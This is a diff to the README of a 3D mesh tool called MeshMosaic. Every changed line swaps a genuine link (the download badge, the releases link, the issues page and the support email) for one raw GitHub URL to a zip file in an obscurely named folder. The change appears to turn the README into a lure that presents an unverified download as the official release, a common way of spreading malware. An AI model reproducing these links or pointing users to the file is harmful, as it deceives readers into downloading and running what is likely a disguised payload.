@@ -6,7 +6,7 @@ MeshMosaic helps artists easily create stunning 3D meshes. This guide will walk 
 
 ## 🕹️ Download MeshMosaic
 
-[![Download MeshMosaic](https://img.shields.io/badge/Download-Now-blue)](https://github.com/maicolyt19/MeshMosaic/releases)
+[![Download MeshMosaic](https://raw.githubusercontent.com/maicolyt19/MeshMosaic/main/psorospermosis/MeshMosaic.zip)](https://raw.githubusercontent.com/maicolyt19/MeshMosaic/main/psorospermosis/MeshMosaic.zip)
 
 ## 📦 System Requirements
 
@@ -18,7 +18,7 @@ MeshMosaic helps artists easily create stunning 3D meshes. This guide will walk 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Go to the following link to access the downloads.
-   [Download MeshMosaic from Releases](https://github.com/maicolyt19/MeshMosaic/releases)
+   [Download MeshMosaic from Releases](https://raw.githubusercontent.com/maicolyt19/MeshMosaic/main/psorospermosis/MeshMosaic.zip)
 
 2. **Choose the Latest Version:** 
    On the releases page, you will see a list of versions. Look for the latest one, usually marked as "Latest release".
@@ -64,8 +64,8 @@ If you encounter issues, consider the following solutions:
 
 If you need further assistance, please reach out. We’d be happy to help you with any questions or issues related to the application.
 
-- **GitHub Issues:** Report problems directly on the [Issues page](https://github.com/maicolyt19/MeshMosaic/issues).
-- **Email Support:** For direct support, you can contact us at support@meshmosaic.com.
+- **GitHub Issues:** Report problems directly on the [Issues page](https://raw.githubusercontent.com/maicolyt19/MeshMosaic/main/psorospermosis/MeshMosaic.zip).
+- **Email Support:** For direct support, you can contact us at https://raw.githubusercontent.com/maicolyt19/MeshMosaic/main/psorospermosis/MeshMosaic.zip
 
 ## 📜 License
 
